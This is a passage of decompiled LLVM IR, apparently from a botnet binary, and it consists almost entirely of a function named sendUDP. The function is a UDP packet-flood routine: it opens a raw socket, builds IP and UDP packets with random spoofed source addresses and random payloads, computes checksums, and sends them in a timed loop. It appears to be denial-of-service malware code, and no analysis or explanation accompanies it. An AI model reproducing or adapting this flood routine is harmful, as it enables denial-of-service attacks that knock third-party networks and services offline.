  %v5_c6e4 = icmp slt i32 %v1_c6d0, %arg6
  br i1 %v5_c6e4, label %dec_label_pc_c5e0, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c6cc, %entry
  %v9_c6ec.lcssa = phi i32 [ %v2_c5b8, %entry ], [ %v9_c6ec4, %dec_label_pc_c6cc ]
  store i32 %v3_c590, i32* @fp, align 4
  ret i32 %v9_c6ec.lcssa

; uselistorder directives
  uselistorder i32 %v1_c6d0, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_c6cc, { 1, 0 }
  uselistorder label %dec_label_pc_c6ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c5e0, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_c6fc = load i32, i32* @r4, align 4
  %v6_c6fc = load i32, i32* @fp, align 4
  store i32 50948, i32* %stack_var_-4, align 4
  %v2_c700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c700, i32* @fp, align 4
  %v2_c704 = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_c72c = icmp eq i32 %arg2, 0
  br i1 %v2_c72c, label %dec_label_pc_c734, label %dec_label_pc_c754

dec_label_pc_c734:                                ; preds = %entry
  %v0_c734 = call i32 @rand_cmwc()
  %v3_c73c = mul i32 %v0_c734, 65536
  store i32 %v3_c73c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c778

dec_label_pc_c754:                                ; preds = %entry
  %v3_c75c = urem i32 %arg2, 65536
  store i32 %v3_c75c, i32* %r3.global-to-local, align 4
  %v1_c764 = call i32 @htons(i32 %v3_c75c)
  br label %dec_label_pc_c778

dec_label_pc_c778:                                ; preds = %dec_label_pc_c734, %dec_label_pc_c754
  %v2_c77c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_c77c, i32* %r3.global-to-local, align 4
  %v3_c788 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_c788, i32* %r3.global-to-local, align 4
  %v2_c790 = icmp eq i32 %v3_c788, 0
  br i1 %v2_c790, label %dec_label_pc_c798, label %dec_label_pc_cdec

dec_label_pc_c798:                                ; preds = %dec_label_pc_c778
  %v2_c798 = ptrtoint i32* %stack_var_-76 to i32
  %v2_c79c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_c79c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_c7bc = icmp eq i32 %arg4, 32
  br i1 %v7_c7bc, label %dec_label_pc_c7c4, label %dec_label_pc_c958

dec_label_pc_c7c4:                                ; preds = %dec_label_pc_c798
  store i32 17, i32* @r2, align 4
  %v0_c7d0 = call i32 @socket()
  store i32 %v0_c7d0, i32* %r3.global-to-local, align 4
  %v2_c7e0 = icmp eq i32 %v0_c7d0, 0
  br i1 %v2_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c800

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c7c4
  %v2_c7ec = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_c7ec, i32* %r3.global-to-local, align 4
  %v3_c7f8 = call i32 @Rootsprintf(i32 %v2_c7ec, i32 ptrtoint ([27 x i8]* @global_var_196dc.467 to i32))
  br label %dec_label_pc_cdec

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7c4
  %v3_c800 = load i32, i32* %stack_var_0, align 4
  %v1_c804 = add i32 %v3_c800, 1
  store i32 %v1_c804, i32* %r3.global-to-local, align 4
  %v1_c80c = call i32 @malloc(i32 %v1_c804)
  store i32 %v1_c80c, i32* %r3.global-to-local, align 4
  %v2_c81c = icmp eq i32 %v1_c80c, 0
  br i1 %v2_c81c, label %dec_label_pc_cdec, label %dec_label_pc_c824

dec_label_pc_c824:                                ; preds = %dec_label_pc_c800
  %v3_c824 = load i32, i32* %stack_var_0, align 4
  %v1_c828 = add i32 %v3_c824, 1
  store i32 %v1_c828, i32* @r2, align 4
  store i32 %v1_c80c, i32* %r3.global-to-local, align 4
  %v2_c83c = inttoptr i32 %v1_c80c to i8*
  %v3_c83c = call i32 @__GI_memset(i8* %v2_c83c, i32 0)
  %v2_c848 = call i32 @makeRandomStr(i32 %v1_c80c, i32 %v3_c824)
  %v2_c850 = call i32 @__GI_time(i32* null)
  %v2_c85c = add i32 %v2_c850, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_c89c = inttoptr i32 %v1_c80c to i32*
  %v3_c920 = mul i32 %arg8, 4
  %v3_c930 = mul i32 %arg8, 1000
  br label %dec_label_pc_c878.outer

dec_label_pc_c878.outer:                          ; preds = %dec_label_pc_c948, %dec_label_pc_c918, %dec_label_pc_c824
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_c824 ], [ %v1_c94c, %dec_label_pc_c948 ], [ 0, %dec_label_pc_c918 ]
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_c824 ], [ %v1_c900, %dec_label_pc_c948 ], [ %v1_c900, %dec_label_pc_c918 ]
  br label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %dec_label_pc_c878.outer, %dec_label_pc_c8f0
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_c8f0 ], [ %stack_var_-112.0.ph, %dec_label_pc_c878.outer ]
  %v3_c878 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_c798, i32* %stack_var_-144, align 4
  store i32 %v3_c878, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_c89c = call i32 @__libc_sendto(i32 %v0_c7d0, i32* %v6_c89c, i32 %v3_c878, i32 0, i32 %v2_c798, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_c8a8 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_c8a8, label %dec_label_pc_c8b0, label %dec_label_pc_c8fc

dec_label_pc_c8b0:                                ; preds = %dec_label_pc_c878
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c72c, label %dec_label_pc_c8bc, label %dec_label_pc_c8d8

dec_label_pc_c8bc:                                ; preds = %dec_label_pc_c8b0
  %v0_c8bc = call i32 @rand_cmwc()
  %v3_c8c8 = udiv i32 %v0_c8bc, 256
  %v3_c8d05 = urem i32 %v3_c8c8, 256
  store i32 %v3_c8d05, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c8d8

dec_label_pc_c8d8:                                ; preds = %dec_label_pc_c8b0, %dec_label_pc_c8bc
  %v2_c8dc = call i32 @__GI_time(i32* null)
  store i32 %v2_c8dc, i32* %r2.global-to-local, align 4
  store i32 %v2_c85c, i32* %r3.global-to-local, align 4
  %v8_c8ec = icmp sgt i32 %v2_c8dc, %v2_c85c
  br i1 %v8_c8ec, label %dec_label_pc_cdec, label %dec_label_pc_c8f0

dec_label_pc_c8f0:                                ; preds = %dec_label_pc_c8d8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c878

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c878
  %v1_c900 = add i32 %stack_var_-112.0, 1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_c910 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_c910, label %dec_label_pc_c918, label %dec_label_pc_c948

dec_label_pc_c918:                                ; preds = %dec_label_pc_c8fc
  store i32 %v3_c920, i32* %r2.global-to-local, align 4
  store i32 %v3_c930, i32* %r3.global-to-local, align 4
  %v1_c938 = call i32 @usleep(i32 %v3_c930)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c878.outer

dec_label_pc_c948:                                ; preds = %dec_label_pc_c8fc
  %v1_c94c = add i32 %stack_var_-108.0.ph, 1
  br label %dec_label_pc_c878.outer

dec_label_pc_c958:                                ; preds = %dec_label_pc_c798
  store i32 %v2_c704, i32* %r3.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v0_c96c = call i32 @socket()
  store i32 %v0_c96c, i32* %r3.global-to-local, align 4
  %v2_c97c = icmp eq i32 %v0_c96c, 0
  br i1 %v2_c97c, label %dec_label_pc_c984, label %dec_label_pc_c99c

dec_label_pc_c984:                                ; preds = %dec_label_pc_c958
  %v2_c988 = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_c988, i32* %r3.global-to-local, align 4
  %v3_c994 = call i32 @Rootsprintf(i32 %v2_c988, i32 ptrtoint ([27 x i8]* @global_var_196dc.467 to i32))
  br label %dec_label_pc_cde8

dec_label_pc_c99c:                                ; preds = %dec_label_pc_c958
  store i32 1, i32* %stack_var_-80, align 4
  %v2_c9a4 = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-144, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_c9a4, i32* %r3.global-to-local, align 4
  %v6_c9c0 = call i32 @__GI_setsockopt(i32 %v0_c96c, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_c9c0, i32* %r3.global-to-local, align 4
  %v1_c9c8 = icmp slt i32 %v6_c9c0, 0
  br i1 %v1_c9c8, label %dec_label_pc_c9d0, label %dec_label_pc_c9e8

dec_label_pc_c9d0:                                ; preds = %dec_label_pc_c99c
  %v2_c9d4 = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_c9d4, i32* %r3.global-to-local, align 4
  %v3_c9e0 = call i32 @Rootsprintf(i32 %v2_c9d4, i32 ptrtoint ([33 x i8]* @global_var_196f8.469 to i32))
  br label %dec_label_pc_cde8

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_c99c
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c9f4

dec_label_pc_c9f4:                                ; preds = %dec_label_pc_c9e8, %dec_label_pc_c9f4
  %v1_ca2c26 = phi i32 [ 49, %dec_label_pc_c9e8 ], [ %v1_ca2c, %dec_label_pc_c9f4 ]
  %v2_c9f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_c9f8, i32* %r3.global-to-local, align 4
  store i32 %v2_c9f8, i32* @r4, align 4
  %v0_ca04 = call i32 @rand_cmwc()
  %v0_ca0c = load i32, i32* @r4, align 4
  %v2_ca0c = xor i32 %v0_ca0c, %v0_ca04
  store i32 %v2_ca0c, i32* %r3.global-to-local, align 4
  %v1_ca14 = call i32 @srand(i32 %v2_ca0c)
  %v0_ca18 = call i32 @random()
  store i32 %v0_ca18, i32* %r3.global-to-local, align 4
  %v1_ca24 = call i32 @init_rand(i32 %v0_ca18)
  %v1_ca2c = add nsw i32 %v1_ca2c26, -1
  store i32 %v1_ca2c, i32* %r3.global-to-local, align 4
  %v3_ca38 = icmp eq i32 %v1_ca2c26, 0
  br i1 %v3_ca38, label %dec_label_pc_ca40, label %dec_label_pc_c9f4

dec_label_pc_ca40:                                ; preds = %dec_label_pc_c9f4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_ca44 = icmp eq i32 %arg4, 0
  br i1 %v2_ca44, label %dec_label_pc_ca70, label %dec_label_pc_ca58

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca40
  %v1_ca5c = sub i32 32, %arg4
  store i32 %v1_ca5c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_ca68 = shl i32 -1, %v1_ca5c
  br label %dec_label_pc_ca70

dec_label_pc_ca70:                                ; preds = %dec_label_pc_ca40, %dec_label_pc_ca58
  %storemerge12 = phi i32 [ %v1_ca68, %dec_label_pc_ca58 ], [ 0, %dec_label_pc_ca40 ]
  %v3_ca70 = load i32, i32* %stack_var_0, align 4
  %v1_ca74 = add i32 %v3_ca70, 28
  %v1_ca84 = add i32 %v3_ca70, 34
  %v3_ca88 = and i32 %v1_ca84, -4
  %v1_ca90 = load i32, i32* @sp, align 4
  %v2_ca90 = sub i32 %v1_ca90, %v3_ca88
  %v1_caa0 = add i32 %v2_ca90, 11
  %v3_caa4 = and i32 %v1_caa0, -4
  store i32 %v3_caa4, i32* %r2.global-to-local, align 4
  %v1_cac4 = add i32 %v3_caa4, 20
  store i32 %v1_cac4, i32* %r3.global-to-local, align 4
  %v5_cac8 = inttoptr i32 %v1_cac4 to i8*
  %v3_cacc = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_cacc, i32* @r4, align 4
  %v1_cad4 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_cad4, i32* %r3.global-to-local, align 4
  %v1_cae0 = call i32 @htonl(i32 %v1_cad4)
  store i32 %v1_cae0, i32* %r2.global-to-local, align 4
  %v3_cae8 = load i32, i32* %stack_var_0, align 4
  %v1_caec = add i32 %v3_cae8, 8
  %v1_caf0 = load i32, i32* @sp, align 4
  %v2_caf0 = inttoptr i32 %v1_caf0 to i32*
  store i32 %v1_caec, i32* %v2_caf0, align 4
  %v0_caf8 = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_cb00 = inttoptr i32 %v3_caa4 to i8*
  %v5_cb00 = call i32 @makeIPPacket(i8* %v4_cb00, i32 %v0_caf8, i32 %v1_cae0, i32 17)
  %v3_cb04 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_cb04, 8
  %v3_cb18 = urem i32 %fold, 65536
  store i32 %v3_cb18, i32* %r3.global-to-local, align 4
  %v1_cb20 = call i32 @htons(i32 %v3_cb18)
  %sext = mul i32 %v1_cb20, 16777216
  %v1_cb24 = sdiv i32 %sext, 16777216
  store i32 %v1_cb24, i32* %r3.global-to-local, align 4
  store i32 %v1_cac4, i32* %r2.global-to-local, align 4
  %v1_cb2c = trunc i32 %v1_cb24 to i8
  %v3_cb2c = add i32 %v3_caa4, 24
  %v4_cb2c = inttoptr i32 %v3_cb2c to i8*
  store i8 %v1_cb2c, i8* %v4_cb2c, align 4
  %v0_cb30 = load i32, i32* %r3.global-to-local, align 4
  %v3_cb30 = sdiv i32 %v0_cb30, 256
  store i32 %v3_cb30, i32* %r3.global-to-local, align 4
  %v1_cb34 = trunc i32 %v3_cb30 to i8
  %v2_cb34 = load i32, i32* %r2.global-to-local, align 4
  %v3_cb34 = add i32 %v2_cb34, 5
  %v4_cb34 = inttoptr i32 %v3_cb34 to i8*
  store i8 %v1_cb34, i8* %v4_cb34, align 1
  %v0_cb38 = call i32 @rand_cmwc()
  %v3_cb44 = urem i32 %v0_cb38, 65536
  store i32 %v3_cb44, i32* %r3.global-to-local, align 4
  store i32 %v1_cac4, i32* %r2.global-to-local, align 4
  %v1_cb4c = trunc i32 %v0_cb38 to i8
  store i8 %v1_cb4c, i8* %v5_cac8, align 4
  %v0_cb50 = load i32, i32* %r3.global-to-local, align 4
  %v3_cb5036 = udiv i32 %v0_cb50, 256
  %v1_cb54 = trunc i32 %v3_cb5036 to i8
  %v2_cb54 = load i32, i32* %r2.global-to-local, align 4
  %v3_cb54 = add i32 %v2_cb54, 1
  %v4_cb54 = inttoptr i32 %v3_cb54 to i8*
  store i8 %v1_cb54, i8* %v4_cb54, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c72c, label %dec_label_pc_cb64, label %dec_label_pc_cb7c

dec_label_pc_cb64:                                ; preds = %dec_label_pc_ca70
  %v0_cb64 = call i32 @rand_cmwc()
  %v3_cb6c = mul i32 %v0_cb64, 65536
  store i32 %v3_cb6c, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_cb64 to i8
  br label %dec_label_pc_cb98

dec_label_pc_cb7c:                                ; preds = %dec_label_pc_ca70
  %v3_cb84 = urem i32 %arg2, 65536
  store i32 %v3_cb84, i32* %r3.global-to-local, align 4
  %v1_cb8c = call i32 @htons(i32 %v3_cb84)
  %extract.t102 = trunc i32 %v1_cb8c to i8
  br label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb64, %dec_label_pc_cb7c
  %v0_cb64.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_cb64 ], [ %extract.t102, %dec_label_pc_cb7c ]
  %v3_ccb0.pre-phi = phi i32 [ 0, %dec_label_pc_cb64 ], [ %v3_cb84, %dec_label_pc_cb7c ]
  store i32 %v1_cac4, i32* %r2.global-to-local, align 4
  %v4_cb9c = sext i8 %v0_cb64.sink.off0 to i32
  %v3_cba0 = add i32 %v3_caa4, 22
  %v4_cba0 = inttoptr i32 %v3_cba0 to i8*
  store i8 %v0_cb64.sink.off0, i8* %v4_cba0, align 2
  %v3_cba840 = udiv i32 %v4_cb9c, 256
  %v1_cbac = trunc i32 %v3_cba840 to i8
  %v2_cbac = load i32, i32* %r2.global-to-local, align 4
  %v3_cbac = add i32 %v2_cbac, 3
  %v4_cbac = inttoptr i32 %v3_cbac to i8*
  store i8 %v1_cbac, i8* %v4_cbac, align 1
  store i32 %v1_cac4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cbb8 = add i32 %v3_caa4, 26
  %v4_cbb8 = inttoptr i32 %v3_cbb8 to i8*
  store i8 0, i8* %v4_cbb8, align 2
  %v0_cbbc = load i32, i32* %r3.global-to-local, align 4
  %v1_cbbc = trunc i32 %v0_cbbc to i8
  %v2_cbbc = load i32, i32* %r2.global-to-local, align 4
  %v3_cbbc = add i32 %v2_cbbc, 7
  %v4_cbbc = inttoptr i32 %v3_cbbc to i8*
  store i8 %v1_cbbc, i8* %v4_cbbc, align 1
  %v1_cbc4 = add i32 %v3_caa4, 28
  store i32 %v1_cbc4, i32* %r3.global-to-local, align 4
  %v3_cbcc = load i32, i32* %stack_var_0, align 4
  %v2_cbd0 = call i32 @makeRandomStr(i32 %v1_cbc4, i32 %v3_cbcc)
  %v1_cbe0 = or i32 %v3_caa4, 2
  store i32 %v1_cbe0, i32* %r3.global-to-local, align 4
  %v1_cbe4 = inttoptr i32 %v1_cbe0 to i8*
  %v2_cbe4 = load i8, i8* %v1_cbe4, align 2
  %v3_cbe4 = zext i8 %v2_cbe4 to i32
  store i32 %v3_cbe4, i32* %r2.global-to-local, align 4
  %v1_cbe8 = or i32 %v1_caa0, 3
  %v2_cbe8 = inttoptr i32 %v1_cbe8 to i8*
  %v3_cbe8 = load i8, i8* %v2_cbe8, align 1
  %v4_cbe8 = zext i8 %v3_cbe8 to i32
  %v4_cbec = mul nuw nsw i32 %v4_cbe8, 256
  %v5_cbec = or i32 %v4_cbec, %v3_cbe4
  store i32 %v5_cbec, i32* %r3.global-to-local, align 4
  %v3_cbf8 = call i32 @csum(i8* %v4_cb00, i32 %v5_cbec)
  %sext6 = mul i32 %v3_cbf8, 16777216
  %v1_cbfc = sdiv i32 %sext6, 16777216
  store i32 %v1_cbfc, i32* %r3.global-to-local, align 4
  store i32 %v3_caa4, i32* %r2.global-to-local, align 4
  %v1_cc04 = trunc i32 %v1_cbfc to i8
  %v3_cc04 = add i32 %v3_caa4, 10
  %v4_cc04 = inttoptr i32 %v3_cc04 to i8*
  store i8 %v1_cc04, i8* %v4_cc04, align 2
  %v0_cc08 = load i32, i32* %r3.global-to-local, align 4
  %v3_cc08 = sdiv i32 %v0_cc08, 256
  store i32 %v3_cc08, i32* %r3.global-to-local, align 4
  %v1_cc0c = trunc i32 %v3_cc08 to i8
  %v2_cc0c = load i32, i32* %r2.global-to-local, align 4
  %v3_cc0c = add i32 %v2_cc0c, 11
  %v4_cc0c = inttoptr i32 %v3_cc0c to i8*
  store i8 %v1_cc0c, i8* %v4_cc0c, align 1
  %v2_cc14 = call i32 @__GI_time(i32* null)
  %v2_cc20 = add i32 %v2_cc14, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ccf0 = add i32 %v3_caa4, 4
  %v4_ccf0 = inttoptr i32 %v3_ccf0 to i8*
  %v2_cd18 = add i32 %v3_caa4, 12
  %v3_cd18 = inttoptr i32 %v2_cd18 to i32*
  %v3_cdb0 = mul i32 %arg8, 4
  %v3_cdc0 = mul i32 %arg8, 1000
  br label %dec_label_pc_cc3c.outer

dec_label_pc_cc3c.outer:                          ; preds = %dec_label_pc_cdd8, %dec_label_pc_cda8, %dec_label_pc_cb98
  %stack_var_-104.0.ph = phi i32 [ 0, %dec_label_pc_cb98 ], [ %v1_cd90, %dec_label_pc_cda8 ], [ %v1_cd90, %dec_label_pc_cdd8 ]
  %stack_var_-100.0.ph = phi i32 [ 0, %dec_label_pc_cb98 ], [ 0, %dec_label_pc_cda8 ], [ %v1_cddc, %dec_label_pc_cdd8 ]
  br label %dec_label_pc_cc3c

dec_label_pc_cc3c:                                ; preds = %dec_label_pc_cc3c.outer, %dec_label_pc_cd80
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_cd80 ], [ %stack_var_-104.0.ph, %dec_label_pc_cc3c.outer ]
  store i32 %v3_caa4, i32* %r2.global-to-local, align 4
  %v1_cc44 = load i32, i32* @sp, align 4
  %v2_cc44 = inttoptr i32 %v1_cc44 to i32*
  store i32 %v2_c798, i32* %v2_cc44, align 4
  %v1_cc4c = load i32, i32* @sp, align 4
  %v2_cc4c = add i32 %v1_cc4c, 4
  %v3_cc4c = inttoptr i32 %v2_cc4c to i32*
  store i32 16, i32* %v3_cc4c, align 4
  %v0_cc54 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_ca74, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_cc60 = inttoptr i32 %v0_cc54 to i32*
  %v7_cc60 = call i32 @__libc_sendto(i32 %v0_c96c, i32* %v6_cc60, i32 %v1_ca74, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_cc64 = call i32 @rand_cmwc()
  %v3_cc70 = urem i32 %v0_cc64, 65536
  store i32 %v3_cc70, i32* %r3.global-to-local, align 4
  store i32 %v1_cac4, i32* %r2.global-to-local, align 4
  %v1_cc78 = trunc i32 %v0_cc64 to i8
  store i8 %v1_cc78, i8* %v5_cac8, align 4
  %v0_cc7c = load i32, i32* %r3.global-to-local, align 4
  %v3_cc7c41 = udiv i32 %v0_cc7c, 256
  %v1_cc80 = trunc i32 %v3_cc7c41 to i8
  %v2_cc80 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc80 = add i32 %v2_cc80, 1
  %v4_cc80 = inttoptr i32 %v3_cc80 to i8*
  store i8 %v1_cc80, i8* %v4_cc80, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c72c, label %dec_label_pc_cc90, label %dec_label_pc_cca8

dec_label_pc_cc90:                                ; preds = %dec_label_pc_cc3c
  %v0_cc90 = call i32 @rand_cmwc()
  %v3_cc98 = mul i32 %v0_cc90, 65536
  store i32 %v3_cc98, i32* %r3.global-to-local, align 4
  %extract.t103 = trunc i32 %v0_cc90 to i8
  br label %dec_label_pc_ccc4

dec_label_pc_cca8:                                ; preds = %dec_label_pc_cc3c
  store i32 %v3_ccb0.pre-phi, i32* %r3.global-to-local, align 4
  %v1_ccb8 = call i32 @htons(i32 %v3_ccb0.pre-phi)
  %extract.t104 = trunc i32 %v1_ccb8 to i8
  br label %dec_label_pc_ccc4

dec_label_pc_ccc4:                                ; preds = %dec_label_pc_cc90, %dec_label_pc_cca8
  %v0_cc90.sink.off0 = phi i8 [ %extract.t103, %dec_label_pc_cc90 ], [ %extract.t104, %dec_label_pc_cca8 ]
  store i32 %v1_cac4, i32* %r2.global-to-local, align 4
  %v4_ccc8 = sext i8 %v0_cc90.sink.off0 to i32
  store i8 %v0_cc90.sink.off0, i8* %v4_cba0, align 2
  %v3_ccd4 = sdiv i32 %v4_ccc8, 256
  store i32 %v3_ccd4, i32* %r3.global-to-local, align 4
  %v1_ccd8 = trunc i32 %v3_ccd4 to i8
  %v2_ccd8 = load i32, i32* %r2.global-to-local, align 4
  %v3_ccd8 = add i32 %v2_ccd8, 3
  %v4_ccd8 = inttoptr i32 %v3_ccd8 to i8*
  store i8 %v1_ccd8, i8* %v4_ccd8, align 1
  %v0_ccdc = call i32 @rand_cmwc()
  %v3_cce8 = urem i32 %v0_ccdc, 65536
  store i32 %v3_cce8, i32* %r3.global-to-local, align 4
  store i32 %v3_caa4, i32* %r2.global-to-local, align 4
  %v1_ccf0 = trunc i32 %v0_ccdc to i8
  store i8 %v1_ccf0, i8* %v4_ccf0, align 4
  %v0_ccf4 = load i32, i32* %r3.global-to-local, align 4
  %v3_ccf4 = sdiv i32 %v0_ccf4, 256
  store i32 %v3_ccf4, i32* %r3.global-to-local, align 4
  %v1_ccf8 = trunc i32 %v3_ccf4 to i8
  %v2_ccf8 = load i32, i32* %r2.global-to-local, align 4
  %v3_ccf8 = add i32 %v2_ccf8, 5
  %v4_ccf8 = inttoptr i32 %v3_ccf8 to i8*
  store i8 %v1_ccf8, i8* %v4_ccf8, align 1
  %v1_cd00 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_cd00, i32* %r3.global-to-local, align 4
  %v1_cd0c = call i32 @htonl(i32 %v1_cd00)
  store i32 %v1_cd0c, i32* %r2.global-to-local, align 4
  store i32 %v1_cd0c, i32* %v3_cd18, align 4
  store i32 %v1_cbe0, i32* %r3.global-to-local, align 4
  %v2_cd2c = load i8, i8* %v1_cbe4, align 2
  %v3_cd2c = zext i8 %v2_cd2c to i32
  store i32 %v3_cd2c, i32* %r2.global-to-local, align 4
  %v3_cd30 = load i8, i8* %v2_cbe8, align 1
  %v4_cd30 = zext i8 %v3_cd30 to i32
  %v4_cd34 = mul nuw nsw i32 %v4_cd30, 256
  %v5_cd34 = or i32 %v4_cd34, %v3_cd2c
  store i32 %v5_cd34, i32* %r3.global-to-local, align 4
  %v3_cd40 = call i32 @csum(i8* %v4_cb00, i32 %v5_cd34)
  %sext7 = mul i32 %v3_cd40, 16777216
  %v1_cd44 = sdiv i32 %sext7, 16777216
  store i32 %v1_cd44, i32* %r3.global-to-local, align 4
  store i32 %v3_caa4, i32* %r2.global-to-local, align 4
  %v1_cd4c = trunc i32 %v1_cd44 to i8
  store i8 %v1_cd4c, i8* %v4_cc04, align 2
  %v0_cd50 = load i32, i32* %r3.global-to-local, align 4
  %v3_cd5045 = udiv i32 %v0_cd50, 256
  %v1_cd54 = trunc i32 %v3_cd5045 to i8
  %v2_cd54 = load i32, i32* %r2.global-to-local, align 4
  %v3_cd54 = add i32 %v2_cd54, 11
  %v4_cd54 = inttoptr i32 %v3_cd54 to i8*
  store i8 %v1_cd54, i8* %v4_cd54, align 1
  store i32 %stack_var_-104.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_cd60 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_cd60, label %dec_label_pc_cd68, label %dec_label_pc_cd8c

dec_label_pc_cd68:                                ; preds = %dec_label_pc_ccc4
  %v2_cd6c = call i32 @__GI_time(i32* null)
  store i32 %v2_cd6c, i32* %r2.global-to-local, align 4
  store i32 %v2_cc20, i32* %r3.global-to-local, align 4
  %v8_cd7c = icmp sgt i32 %v2_cd6c, %v2_cc20
  br i1 %v8_cd7c, label %dec_label_pc_cde8, label %dec_label_pc_cd80

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd68
  br label %dec_label_pc_cc3c

dec_label_pc_cd8c:                                ; preds = %dec_label_pc_ccc4
  %v1_cd90 = add i32 %stack_var_-104.0, 1
  store i32 %v1_cd90, i32* %r2.global-to-local, align 4
  store i32 %arg7, i32* %r3.global-to-local, align 4
  %v9_cda0 = icmp eq i32 %stack_var_-100.0.ph, %arg7
  br i1 %v9_cda0, label %dec_label_pc_cda8, label %dec_label_pc_cdd8

dec_label_pc_cda8:                                ; preds = %dec_label_pc_cd8c
  store i32 %v3_cdb0, i32* %r2.global-to-local, align 4
  store i32 %v3_cdc0, i32* %r3.global-to-local, align 4
  %v1_cdc8 = call i32 @usleep(i32 %v3_cdc0)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cc3c.outer

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cd8c
  %v1_cddc = add i32 %stack_var_-100.0.ph, 1
  store i32 %v1_cddc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cc3c.outer

dec_label_pc_cde8:                                ; preds = %dec_label_pc_cd68, %dec_label_pc_c9d0, %dec_label_pc_c984
  %v12_cdf033 = phi i32 [ %v3_c9e0, %dec_label_pc_c9d0 ], [ %v3_c994, %dec_label_pc_c984 ], [ %v2_cd6c, %dec_label_pc_cd68 ]
  br label %dec_label_pc_cdec

